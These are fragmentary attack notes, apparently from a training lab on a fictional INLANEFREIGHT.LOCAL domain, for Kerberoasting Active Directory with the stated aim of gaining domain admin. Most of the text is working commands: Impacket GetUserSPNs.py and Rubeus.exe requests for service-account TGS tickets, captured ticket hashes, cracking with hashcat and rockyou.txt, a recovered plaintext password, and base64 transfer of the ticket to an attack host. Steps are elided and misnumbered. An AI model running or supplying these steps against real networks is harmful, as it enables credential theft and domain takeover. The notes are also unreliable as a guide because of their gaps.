...
--> Kerberoasting often allows to become DOMAIN ADMIN
...
1) Installing Impacket using Pip
sudo python3 -m pip install .

2) Listing SPN Accounts with GetUserSPNs.py
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

3a) Requesting all TGS Tickets
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 

$krb5tgs$23$*BACKUPAGENT$...
$krb5tgs$23$*SOLARWINDSMONITOR$...

3b) Requesting a Single TGS ticket
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev

4) Saving the TGS Ticket to an Output File
...
2) Select all admin accounts
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap /outfile:type.hash

3) Target a specific user
\Rubeus.exe kerberoast /user:testspn /nowrap

[*] Hash                   : $krb5tgs$23$*testspn$INLANEFREIGHT.LOCAL$testspn/kerberoast.inlanefreight.local@INLANEFREIGHT.LOCAL*$CEA71B221FC...
...
0 : not defined and set to the default of RC4_HMAC_MD5
24 : AES 128/256 encryption types are the only ones supported

5) Cracking the Ticket with Hashcat & rockyou.txt
.\Rubeus.exe kerberoast /user:svc_vmwaresso /nowrap /outfile:type.hash
...
64 bytes from 172.16.5.5: icmp_seq=1 ttl=128 time=0.583 ms
...
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user SAPService -outputfile sqldev_tgs
Klmcargo2
...
On Linux domain-joined host :
md5sum sqldev_tgs
91c2572d84354482374a575d83754c22
cat sqldev_tgs |base64 -w 0;echo

On attack host :
echo -n 'JGty' | base64 -d > sqldev_tgs
91c2572d84354482374a575d83754c22
